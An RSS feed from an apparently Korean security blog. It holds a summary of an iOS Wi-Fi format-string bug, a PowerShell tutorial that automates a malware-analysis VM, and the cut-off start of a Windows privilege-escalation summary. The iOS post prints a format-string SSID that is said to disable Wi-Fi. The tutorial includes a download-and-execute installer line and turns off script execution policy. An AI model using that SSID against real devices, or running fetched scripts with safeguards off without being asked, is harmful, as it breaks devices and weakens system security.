<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Mon, 19 Jul 2021 05:03:16 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] IOS wifi RCE 0-day</title>
      <link>https://hackyboiz.github.io/2021/07/19/fabu1ous/2021-07-19/</link>
      <guid>https://hackyboiz.github.io/2021/07/19/fabu1ous/2021-07-19/</guid>
      <pubDate>Mon, 19 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.zecops.com/research/meet-wifidemon-ios-wifi-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.zecops.com/research/meet-wifidemon-ios-wifi-rce-0-day-vulnerability-and-a-zero-click-vulnerability-that-was-silently-patched/">Meet WiFiDemon – iOS WiFi RCE 0-Day Vulnerability, and a Zero-Click Vulnerability That Was Silently Patched</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>iOS 14.6</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>iOS 14의 Wi-Fi-Demon에서 발생하는 Format string bug가 패치되었습니다. 공식 공지에는 WiFi DoS로 공개되었지만 ZecOps Mobile EDR Research의 분석 결과에 따르면 zero-click RCE가 가능합니다. Wi-Fi-Demon은 와이파이 연결과 관련된 프로토콜을 처리하는 system daemon으로 root 권한으로 동작하기 때문에 해당 취약점을 악용해 sandbox escape 및 탈옥에 사용될 수도 있습니다.</p><p><code>%p%s%s%s%s%n</code> 과 같이 SSID(이름)에 format string이 포함된 WiFi에 접속한다면 iPhone의 WiFi 및 핫스팟 기능에 영구적인 장애가 발생합니다. WiFi-Demon은 접속한 WiFi의 SSID를 캐쉬 하고 재시작할 때마다 그 파일에서 SSID를 읽기 때문에 재부팅을 해도 해결할 수 없습니다. WiFi DoS는 iOS 14.4에서 패치되었지만 최신 버전인 14.6에선 여전히 zero-click RCE를 이용한 exploit을 할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/ios/">ios</category>
      
      <category domain="https://hackyboiz.github.io/tags/wifi/">wifi</category>
      
      <category domain="https://hackyboiz.github.io/tags/dos/">dos</category>
      
      <category domain="https://hackyboiz.github.io/tags/apple/">apple</category>
      
      <category domain="https://hackyboiz.github.io/tags/iphone/">iphone</category>
      
      <category domain="https://hackyboiz.github.io/tags/zero-click/">zero-click</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/19/fabu1ous/2021-07-19/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 악성코드 분석용 VM 세팅을 자동화해보자! Part 2</title>
      <link>https://hackyboiz.github.io/2021/07/18/idioth/setting_malware_vm_part2/</link>
      <guid>https://hackyboiz.github.io/2021/07/18/idioth/setting_malware_vm_part2/</guid>
      <pubDate>Sun, 18 Jul 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2021/07/18/idioth/setting_malware_vm_part2/thumbnail.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;서론&quot;&gt;&lt;a href=&quot;#서론&quot; class=&quot;headerlink&quot; title=&quot;서론&quot;&gt;&lt;/a&gt;서론&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2021/07/18/idioth/setting_malware_vm_part2/thumbnail.png"></p><h1 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h1><p>안녕하세요. idioth입니다. 요즘 날씨가 너무 더워서 아무것도 하기가 싫네요… COVID-19도 심해져서 집에서 공부를 하고 있는데 악성코드 분석을 하려고 보니 환경이 세팅된 가상 머신이 없네요?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%201.png"></p><p>급하게 깔아버린 Windows입니다. 아무것도 없군요. 하나하나 설치하기가 귀찮습니다. 하지만 저번 시간에 우리가 진행했던 것이 있죠? 오늘은 애플리케이션 설치 및 바탕화면 바로가기, 작업표시줄 고정을 해봅시다!!!</p><center><img src="./SeekPng.com_anime-face-png_136767.png" width="50%" height="50%"></center><p>하지만 그것조차 너무 하기가 귀찮네요…… 그래도 한 번 시작한 일은 마무리 지어야 하니 시작해봅시다.</p><h1 id="Chocolatey"><a href="#Chocolatey" class="headerlink" title="Chocolatey"></a>Chocolatey</h1><p>Linux 계열 운영체제에서 자동 설정 스크립트를 만들 때 패키지 매니저를 사용하여 간단하게 install 합니다.</p><pre><code class="hljs sql">sudo apm <span class="hljs-keyword">install</span> &lt;<span class="hljs-keyword">package</span>&gt;</code></pre><p>하지만 WIndows Powershell이나 명령 프롬프트에서는 그러한 기능이 딱히 생각이 나지 않습니다. 일일이 찾아가서 다운로드를 눌러 Windows Installer 등을 실행하여 설치하는 경우가 많죠.</p><p>간단하게 설치하고 싶은 분들! 소프트웨어 자동화를 하고 싶은 분들!을 위해 Windows에는 <a href="https://chocolatey.org/">chocolatey</a>가 있습니다!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%202.png"></p><p>chocolatey는 우분투의 apm처럼 windows에서 패키지를 명령줄로 다운로드할 수 있게 만들어줍니다.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%203.png"></p><p>세상에 그럼 설치를 해보도록 할까요?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%204.png"></p><p>‘Get Started’를 클릭하면 아래와 같이 설치하는 방법이 나와있습니다. 영어로 적혀 있고 상당히 길죠? 제가 요약해드리도록 하겠습니다. Powershell을 관리자 권한으로 실행한 후 <code>Set-ExecutionPolicy Unrestricted</code>(추후 실행할 우리의 스크립트를 위함 ㅎ)로 설정하고 다음 명령을 복사해 실행해주면 됩니다.</p><pre><code class="hljs powershell"><span class="hljs-built_in">Set-ExecutionPolicy</span> Bypass <span class="hljs-literal">-Scope</span> <span class="hljs-keyword">Process</span> <span class="hljs-literal">-Force</span>; [<span class="hljs-type">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span class="hljs-type">System.Net.ServicePointManager</span>]::SecurityProtocol <span class="hljs-operator">-bor</span> <span class="hljs-number">3072</span>; <span class="hljs-built_in">iex</span> ((<span class="hljs-built_in">New-Object</span> System.Net.WebClient).DownloadString(<span class="hljs-string">&#x27;https://chocolatey.org/install.ps1&#x27;</span>))</code></pre><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%205.png"></p><p>chocolatey의 설치가 완료되었다면 어떤 패키지가 있는지 확인해볼 수 없겠죠? Find Packages를 클릭하여 어떤 것들이 있는지 확인해봅시다.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%206.png"></p><p>8533개의 패키지가 있다네요! ida도 있는지 확인을 해볼까요?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%207.png"></p><p>IDA free의 최신 버전이 올라와있는 것을 확인할 수 있습니다! 사실 첫 스크립트를 작성하고 게시글을 준비할 때 hex-rays 기능이 없는 IDA만 업로드되어 있어서 함수를 짜서 다운로드를 하도록 하였으나… 게시글을 올릴 시점이 되니까 업데이트가 되어 있더라고요? 하핫…</p><p>아무튼! chocolatey를 설치하고 난 후에는 apm을 사용하는 것처럼 <code>choco install &lt;package&gt;</code>를 통해 애플리케이션을 설치할 수 있습니다. 세상에 너무 간편하잖아? 업데이트도 똑같이 <code>choco upgrade &lt;package&gt;</code>를 통해 진행할 수 있어요. chocolatey 자체를 업데이트한다면 <code>choco upgrade chocolatey</code>를 해주면 됩니다.</p><p>설치된 애플리케이션들은 보통 <code>%ProgramData%\chocolatey\lib</code>의 하위 폴더에 생성되니 기억해두세요! (Wireshark, HxD, VSCode 등은 본래의 설치 경로에 설치됩니다.)</p><h1 id="Chocolatey를-활용한-애플리케이션-다운로드"><a href="#Chocolatey를-활용한-애플리케이션-다운로드" class="headerlink" title="Chocolatey를 활용한 애플리케이션 다운로드"></a>Chocolatey를 활용한 애플리케이션 다운로드</h1><p>우리에겐 chocolatey가 있으므로 다운로드는 걱정할 필요가 없습니다. 다운로드할 패키지 이름만 정해주면 알아서 다운로드해줄 테니까요.</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download_apps</span></span>&#123;    <span class="hljs-comment"># tools list</span>    <span class="hljs-variable">$packages</span> = <span class="hljs-selector-tag">@</span>(        <span class="hljs-string">&quot;hxd&quot;</span>        <span class="hljs-string">&quot;7zip&quot;</span>        <span class="hljs-string">&quot;ghidra&quot;</span>        <span class="hljs-string">&quot;vscode&quot;</span>        <span class="hljs-string">&quot;procmon&quot;</span>        <span class="hljs-string">&quot;procexp&quot;</span>        <span class="hljs-string">&quot;processhacker&quot;</span>        <span class="hljs-string">&quot;python&quot;</span>        <span class="hljs-string">&quot;die&quot;</span>        <span class="hljs-string">&quot;pestudio&quot;</span>        <span class="hljs-string">&quot;googlechrome&quot;</span>        <span class="hljs-string">&quot;autoruns&quot;</span>        <span class="hljs-string">&quot;wireshark&quot;</span>        <span class="hljs-string">&quot;hashmyfiles&quot;</span>        <span class="hljs-string">&quot;strings&quot;</span>        <span class="hljs-string">&quot;ida-free&quot;</span>    )    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$package</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$packages</span>)    &#123;        choco install <span class="hljs-variable">$package</span> <span class="hljs-literal">-y</span>    &#125;&#125;</code></pre><p><code>$packages</code>에 존재하는 패키지는 취향에 따라 추가, 제거, 수정하셔서 사용하시면 됩니다. 매우 매우 간단하죠? 이제 이 스크립트를 실행하여 애플리케이션을 다운로드해봅시다.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%208.png"></p><p><code>download_apps</code> 함수만 실행했을 뿐인데 알아서 다 다운로드 받아주고 있네요. 호호 기특한 녀석입니다. 그러면 이제 설치된 파일들을 입맛에 따라 바탕화면 바로가기, 작업 표시줄 고정을 해줘야겠죠?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%209.png"></p><blockquote><p><del>아 벌써 귀찮다.. 그냥 침대에 누워서 쉬고 싶다…</del></p></blockquote><h1 id="바탕화면-바로가기-만들기"><a href="#바탕화면-바로가기-만들기" class="headerlink" title="바탕화면 바로가기 만들기"></a>바탕화면 바로가기 만들기</h1><p>Powershell 스크립트를 사용해 바탕화면 바로가기를 만드는 작업은 매우 간단합니다. WScript를 통해 CreateShortcut만 해주면 돼요!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_desktop_shortcut</span></span>&#123;    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>,        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$filename</span>    )        <span class="hljs-variable">$dst</span> = <span class="hljs-built_in">Join-Path</span> <span class="hljs-variable">$env:userprofile</span> <span class="hljs-string">&quot;Desktop\<span class="hljs-variable">$filename</span>.lnk&quot;</span>    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> WScript.Shell    <span class="hljs-variable">$shortcut</span> = <span class="hljs-variable">$shell</span>.CreateShortcut(<span class="hljs-variable">$dst</span>)    <span class="hljs-variable">$shortcut</span>.TargetPath = <span class="hljs-variable">$src</span>    <span class="hljs-variable">$shortcut</span>.Save()&#125;</code></pre><p><code>$src</code>는 바로가기를 만들 파일의 경로, <code>$filename</code>은 바로가기로 생성될 파일 이름입니다. 바탕화면에 생성할 것이기 때문에 <code>$dst</code>는 바탕화면으로 고정이 되어있지만, 다른 곳에 만드는 걸 선호한다! 하시면 수정하셔도 되고 <code>$dst</code> 자체를 파라미터로 받으셔도 상관없습니다. :)</p><p>요로코롬 해주면 간단하게 바탕화면 바로가기도 생성 가능!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2010.png"></p><p>뭐야… 이 부분은 너무 쉽잖아? 작업 표시줄 고정도 단숨에 해치워 버려야겠군…</p><h1 id="작업-표시줄-고정하기"><a href="#작업-표시줄-고정하기" class="headerlink" title="작업 표시줄 고정하기"></a>작업 표시줄 고정하기</h1><p>바탕화면 바로가기는 매우 매우 단순했죠? 작업 표시줄 고정하는 것도 매우 매우 단순합니다! 3줄이면 돼요!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pin_taskbar</span></span>&#123;    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>    )    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> <span class="hljs-string">&quot;Shell.Application&quot;</span>    <span class="hljs-variable">$pin</span> = <span class="hljs-variable">$shell</span>.NameSpace((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).DirectoryName).ParseName((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).Name)    <span class="hljs-variable">$pin</span>.InvokeVerb(<span class="hljs-string">&quot;taskbarpin&quot;</span>)&#125;</code></pre><p>자 이제 이걸 실행해주면 됩니다! 아하하 너무 쉽다!</p><p>.</p><p>.</p><p>.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2011.png"></p><p>놀라울 만큼 아무 일도 일어나지 않았습니다. 왜지??? 무슨 일이지??? <code>$pin.Verbs()</code>를 통해 확인을 해봅시다.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2012.png"></p><p>없습니다. 네. 작업 표시줄에 고정이 없어요.</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2013.png"></p><p>여기에는 있는데 왜? 왜 저기에는 없는 거지…??? 하지만 인생에 불가능은 없는 법. 없으면 만들어주면 되지 않을까요?</p><p>아래의 코드를 통해 <code>Verbs()</code>에 Taskbar pin 기능을 활성화해봅시다.</p><pre><code class="hljs powershell"><span class="hljs-variable">$value_data</span> = (<span class="hljs-built_in">Get-ItemProperty</span>(<span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\&quot;</span> +    <span class="hljs-string">&quot;Explorer\CommandStore\shell\Windows.taskbarpin&quot;</span>)).ExplorerCommandHandler<span class="hljs-variable">$classes_key</span> = (<span class="hljs-built_in">Get-Item</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Classes&quot;</span>).OpenSubKey(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-variable">$true</span>)<span class="hljs-variable">$shell_key</span> = <span class="hljs-variable">$classes_key</span>.CreateSubKey(<span class="hljs-string">&quot;shell&quot;</span>, <span class="hljs-variable">$true</span>)<span class="hljs-variable">$verb_key</span> = <span class="hljs-variable">$shell_key</span>.CreateSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>, <span class="hljs-variable">$true</span>)<span class="hljs-variable">$verb_key</span>.SetValue(<span class="hljs-string">&quot;ExplorerCommandHandler&quot;</span>, <span class="hljs-variable">$value_data</span>)</code></pre><p><code>$value_data</code>는 <code>Windows.taskbarpin</code>의 <code>ExplorerCommandHandler</code>의 값을 가져옵니다. 그 후 <code>HKEY_CURRENT_USER</code>에 <code>Classes</code>에 <code>shell</code>과 <code>taskbarpin</code>을 만들어서 해당 핸들러의 값을 추가해주면 됩니다. <code>$pin.verbs()</code>로 확인을 해볼까요?</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2014.png"></p><p>taskbarpin이 추가된 것을 확인할 수 있습니다! 이제 <code>$pin.InvokeVerb(&quot;taskbarpin&quot;)</code>을 통해 <code>taskbarpin</code>을 호출해봅시다. 제발 되기를 바라며!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2015.png"></p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2016.png"></p><p>실험 삼아 vscode의 경로를 줬는데 성공적으로 추가되었네요! 이제 원하는 것들을 작업 표시줄에 추가해주면 됩니다. 하지만 그전에…</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2017.png"></p><p>여기에 우리가 만든 <code>taskbarpin</code>이 남아있네요…? 이 녀석의 레지스트리를 지워야겠어요.</p><pre><code class="hljs powershell"><span class="hljs-variable">$shell_key</span>.DeleteSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>)<span class="hljs-keyword">if</span>(<span class="hljs-variable">$shell_key</span>.SubKeyCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$shell_key</span>.ValueCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>)&#123;    <span class="hljs-variable">$classes_key</span>.DeleteSubKey(<span class="hljs-string">&quot;shell&quot;</span>)&#125;</code></pre><p>짠. 이렇게 그냥 지워버리면 됩니다!</p><h1 id="전체-코드"><a href="#전체-코드" class="headerlink" title="전체 코드"></a>전체 코드</h1><p>이제 완성을 해버렸네요. <code>application.psm1</code>의 전체 코드를 확인해봅시다!</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download_apps</span></span>&#123;    <span class="hljs-comment"># tools list</span>    <span class="hljs-variable">$packages</span> = <span class="hljs-selector-tag">@</span>(        <span class="hljs-string">&quot;hxd&quot;</span>        <span class="hljs-string">&quot;7zip&quot;</span>        <span class="hljs-string">&quot;ghidra&quot;</span>        <span class="hljs-string">&quot;vscode&quot;</span>        <span class="hljs-string">&quot;procmon&quot;</span>        <span class="hljs-string">&quot;procexp&quot;</span>        <span class="hljs-string">&quot;processhacker&quot;</span>        <span class="hljs-string">&quot;python&quot;</span>        <span class="hljs-string">&quot;die&quot;</span>        <span class="hljs-string">&quot;pestudio&quot;</span>        <span class="hljs-string">&quot;googlechrome&quot;</span>        <span class="hljs-string">&quot;autoruns&quot;</span>        <span class="hljs-string">&quot;wireshark&quot;</span>        <span class="hljs-string">&quot;hashmyfiles&quot;</span>        <span class="hljs-string">&quot;strings&quot;</span>        <span class="hljs-string">&quot;ida-free&quot;</span>    )    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$package</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$packages</span>)    &#123;        choco install <span class="hljs-variable">$package</span> <span class="hljs-literal">-y</span>    &#125;&#125;<span class="hljs-comment"># refer: https://dotnet-helpers.com/powershell/create-shortcuts-on-desktops-using-powershell/</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create_desktop_shortcut</span></span>&#123;    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>,        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$filename</span>    )        <span class="hljs-variable">$dst</span> = <span class="hljs-built_in">Join-Path</span> <span class="hljs-variable">$env:userprofile</span> <span class="hljs-string">&quot;Desktop\<span class="hljs-variable">$filename</span>.lnk&quot;</span>    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> WScript.Shell    <span class="hljs-variable">$shortcut</span> = <span class="hljs-variable">$shell</span>.CreateShortcut(<span class="hljs-variable">$dst</span>)    <span class="hljs-variable">$shortcut</span>.TargetPath = <span class="hljs-variable">$src</span>    <span class="hljs-variable">$shortcut</span>.Save()&#125;<span class="hljs-comment"># refer: https://stackoverflow.com/questions/31720595/pin-program-to-taskbar-using-ps-in-windows-10</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pin_taskbar</span></span>&#123;    <span class="hljs-keyword">param</span> (        [<span class="hljs-built_in">string</span>]<span class="hljs-variable">$src</span>    )    <span class="hljs-variable">$value_data</span> = (<span class="hljs-built_in">Get-ItemProperty</span>(<span class="hljs-string">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\&quot;</span> +    <span class="hljs-string">&quot;Explorer\CommandStore\shell\Windows.taskbarpin&quot;</span>)).ExplorerCommandHandler    <span class="hljs-variable">$classes_key</span> = (<span class="hljs-built_in">Get-Item</span> <span class="hljs-string">&quot;HKCU:\SOFTWARE\Classes&quot;</span>).OpenSubKey(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-variable">$true</span>)    <span class="hljs-variable">$shell_key</span> = <span class="hljs-variable">$classes_key</span>.CreateSubKey(<span class="hljs-string">&quot;shell&quot;</span>, <span class="hljs-variable">$true</span>)    <span class="hljs-variable">$verb_key</span> = <span class="hljs-variable">$shell_key</span>.CreateSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>, <span class="hljs-variable">$true</span>)    <span class="hljs-variable">$verb_key</span>.SetValue(<span class="hljs-string">&quot;ExplorerCommandHandler&quot;</span>, <span class="hljs-variable">$value_data</span>)    <span class="hljs-variable">$shell</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-ComObject</span> <span class="hljs-string">&quot;Shell.Application&quot;</span>    <span class="hljs-variable">$pin</span> = <span class="hljs-variable">$shell</span>.NameSpace((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).DirectoryName).ParseName((<span class="hljs-built_in">Get-Item</span> <span class="hljs-variable">$src</span>).Name)    <span class="hljs-variable">$pin</span>.InvokeVerb(<span class="hljs-string">&quot;taskbarpin&quot;</span>)    <span class="hljs-variable">$shell_key</span>.DeleteSubKey(<span class="hljs-string">&quot;taskbarpin&quot;</span>)    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$shell_key</span>.SubKeyCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$shell_key</span>.ValueCount <span class="hljs-operator">-eq</span> <span class="hljs-number">0</span>)    &#123;        <span class="hljs-variable">$classes_key</span>.DeleteSubKey(<span class="hljs-string">&quot;shell&quot;</span>)    &#125;&#125;</code></pre><p>생각보다 기능이 많이 없죠? 하지만 이걸로도 간단하게 자동화 스크립트를 만들 수 있다는 사실! 이전에 만들었던 <code>install.ps1</code>에 원하는 부분을 추가하고 실행을 해봅시다. +_+</p><pre><code class="hljs powershell"><span class="hljs-comment"># download apps</span>download_apps<span class="hljs-comment"># create desktop shortcut</span>create_desktop_shortcut <span class="hljs-string">&quot;C:\Program Files\Wireshark\Wireshark.exe&quot;</span> <span class="hljs-string">&quot;Wireshark&quot;</span><span class="hljs-comment"># pin taskbar</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\procexp\tools\procexp.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\procexp\tools\procexp64.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\die\tools\die_win64_portable\die.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\ProgramData\chocolatey\lib\PeStudio\tools\pestudio\pestudio.exe&quot;</span>pin_taskbar <span class="hljs-string">&quot;C:\Program Files\Microsoft VS Code\Code.exe&quot;</span></code></pre><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2018.png"></p><p>짠! 우리가 고대하던 것들이 스크립트 하나로 끝났습니다. 작업 표시줄에도 고정되었고, Wireshark도 바탕화면 바로가기로 만들어졌네요!</p><p><img src="/2021/07/18/idioth/setting_malware_vm_part2/Untitled%2019.png"></p><p>하얗게 불태워 버렸습니다.</p><h1 id="마치며…"><a href="#마치며…" class="headerlink" title="마치며…"></a>마치며…</h1><p>기술적으로 어려운 부분도 아니고 단지 처음 만들고 찾아보기가 굉장<del>~</del>히 귀찮은 작업이라고 생각합니다. 사실상 기능들은 stack overflow에 다 나와 있어서 현재 버전에 사용되지 않으면 사용되는 부분을 찾거나 하면 되거든요. 해당 스크립트는 <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">MSEdge on Win10 (x64) Stable 1809 버전</a>을 기준으로 작성되었습니다. 악성코드 분석을 할 때 항상 저걸 사용해서 하거든요 :)</p><p>따라서 현재 OS 버전 21H1에서는 동작하지 않을 수도 있습니다. (실제로 로컬에 테스트를 했을 때 작업표시줄 고정이 안되더군요… 일시적인 건가? 아무튼 이것 때문에 삽질을 좀 했습니다… ㅠㅠ)</p><p>추가적으로 아쉬운 부분은 Windbg Preview 버전을 자동으로 설치하고 싶었는데, Store apps를 스크립트로 옮기는 과정이 복잡하더군요. 다운로드 링크를 직접 주는 사이트를 발견해서 작업을 해보았으나, 권한이 없다는 말이 계속 떠서… ㅜㅜ 깔끔하게 포기했습니다. 나중에 chocolatey에 추가되길 간절히 기원하고 있습니다.</p><p>잡담이 길었네요! 제가 많이 사용하는 애플리케이션만 추가해놓고, 저는 보통 시작 - 검색 기능으로 애플리케이션을 실행하는 것을 선호해서 (깔끔한 걸 좋아합니다.) 사실 바탕화면 바로가기나 작업 표시줄 고정 기능을 많이 사용하지 않아요. 이 부분도 취향에 맞게 수정하셔서 사용하시면 됩니다.</p><p>전체 소스 코드는 <a href="https://github.com/idioth/malvm">github</a>에 업로드되어 있으니, 많은 구경 부탁드리고 피드백 또한 언제나 환영입니다! 감사합니다 :)</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://dotnet-helpers.com/powershell/create-shortcuts-on-desktops-using-powershell/">https://dotnet-helpers.com/powershell/create-shortcuts-on-desktops-using-powershell/</a></p><p><a href="https://stackoverflow.com/questions/31720595/pin-program-to-taskbar-using-ps-in-windows-10">https://stackoverflow.com/questions/31720595/pin-program-to-taskbar-using-ps-in-windows-10</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/powershell/">powershell</category>
      
      <category domain="https://hackyboiz.github.io/tags/automated/">automated</category>
      
      <category domain="https://hackyboiz.github.io/tags/virtual-machine/">virtual machine</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/18/idioth/setting_malware_vm_part2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Windows: CreateProcessWithLogon Write Restricted Service EoP</title>
      <link>https://hackyboiz.github.io/2021/07/16/j0ker/2021-07-16/</link>
      <guid>https://hackyboiz.github.io/2021/07/16/j0ker/2021-07-16/</guid>
      <pubDate>Fri, 16 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/det</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2194">https://bugs.chromium.org/p/project-zero/issues/detail?id=2194</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Vista 이후로 <code>Windows Service Hardening</code>이라는 미티게이션이 추가되었었습니다. 이 미티게이션의 기능 중 하나가 <code>Write Restrict token</code>인데, 이는 해당 토큰을 가진 프로세서에서는 다른 리소스에 쓰기가 제한되는 미티게이션입니다. 현재 Windows 10에서는 대략 10개의 서비스에 해당 미티게이션이 적용되어 있다고 합니다.</p><p>James Forshaw가 이번에 찾은 취약점(비록 마이크로소프트가 취약점이라고 인정하진 않았지만…)은 이 미티게이션을 우회할 수 있습니다. <code>Write Restriction</code>이 걸린 서비스 프로세스에서 <code>CreateProcessWithLogon</code> 함수에 <code>LOGON_NERCREDENTIALS_ONLY</code> 플래그를 세팅하고 호출할 시 Write Restriction이 적용되지 않은 새로운 프로세스를 실행할 수 있습니다. 새로운 프로세스는 Write Restriction이 걸려있지 않을 뿐 아니라 <code>INTERACTIVE</code> 그룹 SID가 추가됩니다. 또한 이 취약점은 <code>LOCAL SERVICE</code>, <code>NETWORK SERVICE</code> 또는 <code>Virtual Service Account</code> 계정에서도 트리거가 가능하며 <code>SeImpersonatePrivilege</code>나 <code>SeAssignPrimaryTokenPrivilege</code> 같은 권한이 필요하지도 않습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/token/">token</category>
      
      <category domain="https://hackyboiz.github.io/tags/createprocesswithlogon/">createprocesswithlogon</category>
      
      
